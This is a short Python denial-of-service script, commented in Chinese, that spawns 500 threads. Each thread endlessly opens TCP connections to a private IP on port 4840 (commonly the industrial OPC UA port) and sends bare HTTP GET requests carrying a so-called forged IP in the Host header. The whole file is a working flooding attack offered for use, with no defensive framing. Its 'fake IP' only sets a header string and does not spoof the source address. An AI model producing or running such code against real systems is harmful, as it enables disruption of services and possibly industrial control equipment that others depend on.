import socket
import threading

target_ip = '10.4.3.195'  # 目标IP地址
target_port = 4840  # 目标端口
fake_ip = '10.5.0.94'  # 伪造IP地址

def dos_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

# 创建多个线程进行攻击
for i in range(500):
    thread = threading.Thread(target=dos_attack)
    thread.start()